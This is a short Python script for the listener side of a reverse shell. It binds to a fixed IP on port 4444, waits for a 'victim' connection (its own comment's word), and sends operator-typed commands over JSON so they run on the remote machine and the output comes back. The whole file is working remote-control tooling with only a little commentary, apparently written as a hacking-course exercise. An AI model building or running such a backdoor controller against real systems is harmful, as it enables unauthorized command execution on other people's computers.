import socket,json
from unittest import result

class Listener:
    def __init__(self,host,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #basically using the same address when is there is a disconnection between victim and listener
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((host,port))
        listener.listen(0)
        print("waiting for connections")
        #accept return two objects 1. connection - socket object to send and receive data 
        #2. address that is responsible for communication
        self.connection , address = listener.accept()
        print(" [+] connection from " + str(address))
        print(' Connection Established')
    def reliable_send(self,data):
        json_data = json.dumps(data)
        json_data = json_data.encode()
        self.connection.send(json_data)
    def reliable_receive(self):
        #data will receive at bytes and cound't able to transfer all data at once
        # so while loop is requried to make sure all data is received and print other than
        #the buffer size which we always give
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
         print('in execute remotely funciton')
         result1 = self.reliable_send(command)
         result2 = self.reliable_receive()
         print(type(result2),result2)
        #  return result1
         return result2
    def run(self):
     while True:
        command = input(' >>>> enter input ')
        # command = command.encode()
        result = self.execute_remotely(command)
        # result = result.decode()
        print(result)

listen = Listener("10.207.48.142", 4444)
listen.run()
       